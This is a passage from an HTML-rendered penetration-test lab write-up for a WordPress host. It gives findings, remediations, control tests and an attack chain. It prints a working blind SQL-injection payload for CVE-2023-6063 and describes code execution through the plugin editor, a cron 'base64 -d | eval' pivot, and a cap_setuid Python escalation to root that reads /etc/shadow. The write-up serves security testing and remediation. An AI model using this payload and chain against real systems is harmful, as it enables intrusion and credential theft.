+<td>kvzlx → root</td>
+</tr>
+<tr>
+<td>F8</td>
+<td>Root password login over SSH enabled (<code>PermitRootLogin yes</code>, <code>PasswordAuthentication yes</code>, <code>UsePAM no</code>)</td>
+<td>CWE-1392</td>
+<td>Remote root if the root password is guessed or reused</td>
+</tr>
+<tr>
+<td>F9</td>
+<td>Reused/derived credentials across services: the database password and <code>kvzlx</code>'s SSH password are the same string with <code>$4</code> and spaces inserted</td>
+<td>CWE-1392</td>
+<td>One leak pivots to several services</td>
+</tr>
+</tbody>
+</table>
+<h3 id="root-cause-and-remediation-per-finding">Root cause and remediation, per finding</h3>
+<ul>
+<li><strong>F1</strong> — <code>$username</code> derived from a cookie is interpolated into a double-quoted SQL literal
+before <code>wp_magic_quotes()</code> runs. Fix: upgrade to <strong>1.2.2 or later</strong>; upstream's fix escapes the
+value. Independent of the patch, the correct pattern is <code>$wpdb-&gt;prepare()</code> with a placeholder —
+and the sanitisation must be applied at the point of use, not by a global input filter that runs
+later in the request lifecycle. That ordering is the actual defect: a value reaching a query
+before the sanitiser has executed is unsanitised no matter what the sanitiser would have done.</li>
+<li><strong>F2</strong> — Not separately fixable; it is the consequence of F1. Reduce blast radius by removing
+unused accounts and by not treating a database read as a boundary.</li>
+<li><strong>F3</strong> — Delete the credential from the page and rotate it. Treat every credential that has
+ever been rendered to a page as compromised.</li>
+<li><strong>F4</strong> — Apply protection to every vhost, or replace per-site plugin gating with a single
+enforcement point at the reverse proxy. Per-vhost policy is per-vhost policy; it will drift.</li>
+<li><strong>F5</strong> — Disable the theme and plugin editors (<code>DISALLOW_FILE_EDIT</code>, <code>DISALLOW_FILE_MODS</code>),
+and require a second factor for administrator logins. Least privilege for the web tier.</li>
+<li><strong>F6</strong> — Remove <code>eval</code> from the cron script; if a job must consume external input, parse it as
+data and never pass it to a shell. Do not let a lower-privileged account's writable directory
+feed a higher-privileged account's scheduler. Write cron output to a mode-<code>600</code> file.</li>
+<li><strong>F7</strong> — Remove the capability (<code>setcap -r /opt/python3</code>). A general-purpose interpreter should
+never hold <code>cap_setuid</code>; if a task genuinely needs privilege, use a purpose-built, minimal
+binary. Audit with <code>getcap -r /</code>, not only a SUID sweep.</li>
+<li><strong>F8</strong> — <code>PermitRootLogin no</code>, key-based authentication, and no password reuse across services.</li>
+<li><strong>F9</strong> — Unique, randomly generated credentials per service, stored in a secret manager.</li>
+</ul>
+<hr />
+<h2 id="5-control-tests">5. Control tests</h2>
+<p>Every control below has a paired positive, so a control that cannot detect success cannot certify
+a negative.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Assertion</th>
+<th>Positive control</th>
+<th>Negative control</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C1</td>
+<td>SQLi oracle detects a hit</td>
+<td><code>1=1</code> → 3.012 s / 7.014 s at two different sleep values</td>
+<td><code>1=0</code> → 0.010 s</td>
+<td>Pass</td>
+</tr>
+<tr>
+<td>C2</td>
+<td>Timing is proportional, not constant</td>
+<td>SLEEP 3 → 3.012 s; SLEEP 7 → 7.014 s (slope 1.000)</td>
+<td>no-SLEEP → 0.012 s floor</td>
+<td>Pass</td>
+</tr>
+<tr>
+<td>C3</td>
+<td>Extractor can return a value</td>
+<td><code>CONTROLVALUE</code> recovered exactly, len 12</td>
+<td>—</td>
+<td>Pass (aborts the run otherwise)</td>
+</tr>
+<tr>
+<td>C4</td>
+<td>Extracted data matches reality</td>
+<td>SQLi row vs independent direct read: identical incl. hash</td>
+<td>—</td>
+<td>Pass</td>
+</tr>
+<tr>
+<td>C5</td>
+<td>Hash scheme is what it claims</td>
+<td>MD5 KAT 3/3 RFC 1321; <code>CheckPassword</code> → <code>true</code></td>
+<td>re-hash differs (random salt) — expected, and why re-hash is not the oracle</td>
+<td>Pass</td>
+</tr>
+<tr>
+<td>C6</td>
+<td>RCE is the web server identity</td>
+<td><code>id</code> → <code>uid=33(www-data)</code></td>
+<td>—</td>
+<td>Pass</td>
+</tr>
+<tr>
+<td>C7</td>
+<td>Login endpoint reachable, not broken</td>
+<td>correct password → 302 + session cookie, dashboard 200</td>
+<td>wrong password → <strong>identical</strong> 302</td>
+<td>Pass — control is why I did not misread it as a bad password</td>
+</tr>
+<tr>
+<td>C8</td>
+<td>Plugin write actually landed</td>
+<td>file mtime advances to assessment time</td>
+<td>first attempt (<code>_wpnonce</code>): 200 but mtime unchanged</td>
+<td>Pass</td>
+</tr>
+<tr>
+<td>C9</td>
+<td>Cron is the execution path</td>
+<td><code>/tmp/decoded.txt</code> shows the payload; <code>id</code> → <code>uid=1000(kvzlx)</code></td>
+<td>—</td>
+<td>Pass</td>
+</tr>
+<tr>
+<td>C10</td>
+<td>ACL denies www-data</td>
+<td>—</td>
+<td>www-data → <code>Permission denied</code> on <code>/opt/python3</code></td>
+<td>Control held</td>
+</tr>
+<tr>
+<td>C11</td>
+<td>ACL permits kvzlx, and that is what escalates</td>
+<td><code>/opt/python3</code> as kvzlx reads <code>/etc/shadow</code></td>
+<td><code>/usr/bin/python3</code> and plain <code>cat</code> as kvzlx → <code>Permission denied</code></td>
+<td>Pass</td>
+</tr>
+<tr>
+<td>C12</td>
+<td>Escalation really yields root</td>
+<td><code>euid=0</code>, <code>/etc/shadow</code> read, file owner becomes <code>root:kvzlx</code></td>
+<td><code>os.seteuid(0)</code> alone leaves <code>id</code> printing <code>uid=1000</code></td>
+<td>Pass</td>
+</tr>
+</tbody>
+</table>
+<h3 id="controls-that-held-findings-not-used">Controls that held (findings not used)</h3>
+<ul>
+<li><strong><code>LOAD_FILE()</code> / <code>FILE</code> privilege</strong> — I tested whether the injection was also an OS file-read
+primitive, since the database server runs as root. It is not. <code>GRANT USAGE ON *.*</code> plus
+<code>GRANT ALL PRIVILEGES ON wordpress.*</code> — <code>FILE</code> is a global privilege and cannot be granted at
+database scope, so <code>LOAD_FILE</code> returns <code>NULL</code> for <code>/etc/shadow</code> (length 0) and <code>/etc/hostname</code>.
+Three independent lines agree: the extractor control proves the harness can read non-empty
+strings; the files certainly exist; the grants show no <code>FILE</code>. <strong>The SQLi is database-scope
+only and read-only</strong>, exactly as the advisory states. No <code>INTO OUTFILE</code> write primitive either —
+the injection point is in the <code>ON</code> clause, and stacked queries are unavailable through <code>get_var</code>.</li>
+<li><strong>Concurrency</strong> — all oracle traffic sequential. An earlier lab established that oversubscribing
+a single-worker target returns identical responses for every request and falsifies the whole run.</li>
+</ul>
+<h3 id="not-tested--out-of-scope">Not tested / out of scope</h3>
+<ul>
+<li>The 1,376-candidate themed list and 517,506-line list were run to exhaustion but a stronger
+cracker with GPU acceleration and a larger corpus was not available here. This is a limit of
+tooling, not evidence the password is uncrackable.</li>
+<li>Whether F5 is reachable without administrator credentials (e.g. via a separate file-write path)
+was not explored; the chain as solved does not require it.</li>
+<li>The second vhost was treated as in-scope because it is served by the same host. If the
+engagement boundary were host-only, F3 would need a scope confirmation.</li>
+</ul>
+<hr />
+<h2 id="6-chain">6. Chain</h2>
+<pre><code>1. F1  Unauthenticated time-based blind SQLi (CVE-2023-6063)
+      cookie: [wordpress-session-cookie]=&lt;payload&gt;
+      -&gt; oracle calibrated against negative + two positive controls
+2. F2  Extract admin hash, user_level, capabilities
+      -&gt; hash is administrator's, confirmed from wp_usermeta
+      -&gt; hash NOT crackable: 517k list + themed set exhausted, 8192 rounds
+3. F3  Second vhost oledockers.norc.labs discloses the same credential in plaintext
+      -&gt; wp_check_password(plaintext, stolen_hash) == true
+4. F5  /ghost-login (hide-my-wp renamed) -&gt; administrator session
+      -&gt; plugin editor writes an INACTIVE plugin, then activate via REST
+      -&gt; id = uid=33(www-data)
+5. F6  www-data writes /var/www/html/.wp-encrypted.txt (base64)
+      -&gt; kvzlx's per-minute cron: base64 -d | eval
+      -&gt; id = uid=1000(kvzlx)
+6. F7  kvzlx runs /opt/python3 (cap_setuid=ep) -&gt; os.setuid(0)
+      -&gt; euid=0, /etc/shadow read, output file owned root:kvzlx
+</code></pre>
+<p><code>id</code> was run as the identity at every rung, over the real attack path — no <code>su</code> in the final proof.</p>
+<hr />
+<h2 id="7-design-observation">7. Design observation</h2>
+<p>The lab is well constructed in one respect and misleading in another.</p>
+<p><strong>Well constructed:</strong> the escalation ladder is honest. Each rung is a <em>different</em> class of defect
+— injection, credential handling, code execution, a scheduler that evaluates untrusted input, and
+a file capability — and no rung is a shortcut past the previous one. The ACL on <code>/opt/python3</code> is a
+real gate that I had to clear with the <em>correct</em> identity: it denied <code>www-data</code> outright, so the
+intended path is forced through the cron rather than taken directly. The 8192-round hash is
+respectable: it makes offline recovery of the stolen credential impractical, which is exactly the
+property that should make F1 uncomfortable.</p>
+<p><strong>Misleading:</strong> the advertised CVE is the <em>hardest</em> door, not the shortest. A tester who follows the
+description — exploit CVE-2023-6063 — arrives at an administrator hash and then grinds. The
+intended path is almost certainly the misconfigured second vhost (F3), which needs no exploitation
+at all. The injection is the showpiece; the vhost is the key.</p>
+<p>The ACL deserves credit as a design choice that is easy to get wrong: a SUID sweep would never find
+<code>/opt/python3</code>, so a tester using the standard checklist concludes there is no privilege
+escalation available and stops. The lab's escalation is invisible to the most commonly applied
+privesc technique. That is a genuinely good piece of lab design, and it is the reason §7's
+finding — <em>a SUID sweep misses file capabilities</em> — is the most transferable thing here.</p>
+<p>Finally, on the brief's premise: the lab description was accurate about the CVE. The advisory
+metadata is where the errors are, and they are in the public record rather than in the lab.</p>
+<hr />
+<h2 id="8-reproducibility-notes">8. Reproducibility notes</h2>
+<p>The extraction harness and its controls are in <code>blind.py</code>; the phpass implementation, its MD5
+known-answer test, and the wordlist/brute-force crackers are in <code>phpass.py</code>, <code>crack.c</code> and
+<code>crackwl.c</code>. The conditional-oracle form is the load-bearing part:</p>
+<pre><code>nosuchuser&quot; AND (SELECT 1 FROM (SELECT IF(&lt;cond&gt;, SLEEP(2), 0))Pz) AND &quot;qzts&quot;=&quot;qzts&quot;
+</code></pre>
+<p>Target hashes, passwords, session cookies and the disclosed credential are deliberately <strong>not</strong>
+reproduced in this repository.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
